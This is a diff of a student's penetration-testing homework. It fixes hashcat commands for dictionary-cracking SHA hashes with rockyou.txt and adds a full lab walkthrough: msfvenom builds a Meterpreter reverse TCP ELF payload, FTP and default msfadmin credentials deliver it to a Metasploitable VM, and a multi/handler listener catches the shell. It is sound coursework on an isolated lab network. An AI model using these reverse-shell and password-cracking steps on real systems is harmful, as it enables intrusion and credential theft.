@@ -425,7 +425,7 @@ B) Perform a dictionary attack against the hash:
 **<ins>1. Generating / finding a hash to be cracked:</ins>**
 
 **Case 1 - Select a password from a dictionary & create a hash from the selected word**
-- `less rockyou.txt`, 
+- `less rockyou.txt` 
 - Selected word: `coolcat`
   
 - Generate a SHA-256 hash of the selected word: `echo -n coolcat | sha256sum`
@@ -450,12 +450,12 @@ B) Perform a dictionary attack against the hash:
 
 **<ins>3. Cracking the hash:</ins>**
 
-- **Case 1**: `hashcat -m 1400 ' ddd9ab3e81e06b4c405d4cc401d6651de4ec99513fe314ab7f69d66db026a1b6' rockyou.txt -o solved_2`
+- **Case 1**: `hashcat -m 1400 'ddd9ab3e81e06b4c405d4cc401d6651de4ec99513fe314ab7f69d66db026a1b6' rockyou.txt -o solved_2`
   - Check the solution: `cat solved_2`
   
   ![hash2](images/h4-images/f_3.png)
 
-- **Case 2**: `hashcat -m 100 ' b89eaac7e61417341b710b727768294d0e6a277b ' rockyou.txt -o solved_2`
+- **Case 2**: `hashcat -m 100 'b89eaac7e61417341b710b727768294d0e6a277b' rockyou.txt -o solved_2`
   - `Status: Exhausted`Indicates there was no matching password in the dictionary.
   - To confirm the result: `grep -x "hashcat" rockyou.txt` (the matching plaintext was solved with an online hash cracking tool). 
   
@@ -475,9 +475,134 @@ B) Perform a dictionary attack against the hash:
 
 
 # G) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.
-- 
 
+**<ins>Task description:</ins>**
+
+- Generate a reverse shell payload using Msfvenom, transfer it to a vulnerable target machine (Metasploitable 2), and catch the connection with a Metasploit listener.
+
+**<ins>Key tools:</ins>**
+
+- **Kali Linux VM**: Used to generate the payload and catch the connection
+- **Metasploitable VM**: A deliberately vulnerable Linux VM that contains common security flaws. Default login: `msfadmin:msfadmin`
+- **Metasploit**: A framework that provides tools for probing/exploiting known vulnerabilities on networks and servers, managing payloads and sessions, as well as automating attacks. Includes a CLI (msfconsole) and scripting capabilities for customizing attacks.
+- **Msfvenom**: A tool within the Metasploit Framework used to generate and encode custom payloads.
+- **Msfconsole**: A CLI for the Metasploit Framework used to launch exploits, establish listeners, manage sessions and interact with compromised target systems.
+
+- Both msfvenom and metasploit should come pre-installed on Kali. The following commands confirm their installation & display the tools’ help menus: `msfvenom`, `msfconsole`
+
+**<ins>1. Setting Up an Isolated Host-Only Network: </ins>**
+
+- A host-only network allows the two VMs (attacker & target) to communicate only with each other while preventing the attack from reaching outside networks/ the internet. 
+- The host-only network has already been configured in h1 task F).  
+- Disconnect the Kali VM from the internet: Disconnect the cable (adapter 1) from network settings & verify with `ping 8.8.8.8`
+- Boot up both the Kali & Metasploitable VMs
+
+- **Checking the IP addresses of the VM’s with `ifconfig` or `ip a`**:  
+  - Kali Linux: eth1: 192.168.56.3
+  - Metasploitable 2: eth0: 192.168.56.4
+
+- **Verifying the connection between the VMs & that they are on the same network:**  
+  - `ping 192.168.56.4` (from Kali)
+  - `nmap -sn 192.168.56.0/24`  (scan the subnet to discover all active hosts, from Kali)
+    
+  ![metasploit](images/h4-images/g_3.png)
+    
+  ![metasploit](images/h4-images/g_4.png)
+
+- **Optionally scanning Metasploitable VM for open ports:**  
+  - Port scanning identifies services running on open ports, which potentially expose vulnerabilities that can be exploited. 
+  - Basic scan:  (top 1000 tcp ports): `nmap 192.168.56.4`
+  - Port scanning reveals open ports for port 21 (FTP) and port 22 (SSH). These two will be used later to deliver and activate the reverse shell payload on the target machine. 
+    
+  ![metasploit](images/h4-images/g_5.png)
+
+**<ins>2. Generating the Reverse Shell Payload:</ins>**
+
+- Done on the Kali VM
+  
+- `msfvenom`is used to craft a payload that, when executed on the target machine, connects back to the Kali machine (the attacker)
+  
+- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=5555 -f elf -o reverse-sh.elf`
+  - `-p`: Payload type, reverse TCP shell using Meterpreter. Architecture based on the target (x86 for Metasploitable’s 32-bit environment).
+  - `LHOST`: IP address of the Kali VM (attacker)
+  - `LPORT`: Port to listen on
+  - `-f elf`: Format output as a Linux ELF executable
+  - `-o`: Output filename
+
+- View details of the generated payload file: `file reverse-sh.elf`
+
+   ![metasploit](images/h4-images/x_6.png)
+
+**<ins>3. Transferring the payload to the target (via FTP):</ins>**
+
+- Done on the Kali VM (Both VMs should be running)
+  
+- Connect to the target VM (Metasploitable) using FTP: `ftp 192.168.56.4`   
+- Login: `msfadmin: msfadmin`
+- Upload/transfer the payload: `put reverse-sh.elf`
+- Verify that the payload file has been placed at the target location: `ls`
+- End the FTP session: `bye`
+
+   ![metasploit](images/h4-images/g_7.png)
+
+**<ins>4. Making the payload executable on the target:</ins>**
+
+- Done on the Kali VM
+
+- Establish SSH connection to the Metasploitable VM: `ssh msfadmin@192.168.56.4` & type the default password when prompted.
+  - Note: To explicitly allow ssh-rsa (alternatively ssh-dss) when connecting: ` ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.4`.
+  - Apparently the Metasploitable VM offers only these older key types which are disabled by default in newer versions of OpenSSH for security reasons (explanation & revised command fetched from chatGPT)
+
+  ![metasploit](images/h4-images/g_8.png)
+
+- Make the file executable: `chmod +x reverse-sh.elf`
+
+  ![metasploit](images/h4-images/g_9.png)
+
+- The SSH connection will be left open on this terminal. New terminal will be opened for the listener (next step).
+
+**<ins>5. Setting up/establishing a listener on Kali:</ins>**
+
+- Done on the Kali VM
+
+- Since a firewall has been set up on the Kali VM, it should be instructed to allow incoming TCP connections on port 5555. Otherwise, it might/will block the reverse shell trying to connect back and the shell will fail to establish:
+  - `sudo ufw allow 5555/tcp `  Allows the reverse shell connection to reach the listener
+  - `sudo ufw status` Checks the status
+  - `sudo ufw delete allow 5555/tcp` For revoking the permission later if necessary
+
+- Setting up the listener prepares Metasploit to catch the reverse shell connection when the payload runs on the target.
+
+- Launch Metasploit: `msfconsole`
+- Use the multi/handler module to use the listener & wait for incoming payload connections: `use exploit/multi/handler`
+
+- Set the required options to match the payload (matching settings with msfvenom):
+  - `set lhost 192.168.56.3 `   # IP address of the Kali VM (attacker)
+  - `set lport 5555`
+  - `set payload linux/x86/meterpreter/reverse_tcp `
+
+- Start the listener:
+  - `'run -j `  The `-j` flag runs the exploit as a background job.
+ 
+  ![metasploit](images/h4-images/x_11.png)
+
+**<ins>6. Executing the Payload on the target:</ins>**
+
+- Done on the Kali VM
+
+- Execute the payload in the terminal with the ongoing SSH connection: `./reverse-sh.elf`
+- The reverse shell connects back to the Kali VM (attacker). A meterpreter session should start on the Kali terminal running the Metasploit listener:
+
+  ![metasploit](images/h4-images/g_12.png)
+  
+  ![metasploit](images/h4-images/g_13.png)
+
+- Remove the malicious payload from the Kali VM: `rm reverse-sh.elf `
+  
 ## References / Lähteet:
+- Karvinen 2025 - Tunkeutumistestaus at https://terokarvinen.com/tunkeutumistestaus/ 
+- hxrda (2025). PenetrationTesting_Tunkeutumistestaus/h1-Kybertappoketju.md at main · hxrda/PenetrationTesting_Tunkeutumistestaus. GitHub. Available at: https://github.com/hxrda/PenetrationTesting_Tunkeutumistestaus/blob/main/h1-Kybertappoketju.md  
+- 101LABS (2022). Lab 75 – Establishing a reverse shell on a Linux target using Msfvenom and Metasploit - 101Labs.net. Available at: https://www.101labs.net/comptia-security/lab-75-establishing-a-reverse-shell-on-a-linux-target-using-msfvenom-and-metasploit/.
+- Hacktricks (2025). MSFVenom - CheatSheet - HackTricks.wiki Available at: https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/msfvenom.html.
 
 
 # Tehtävänanto:
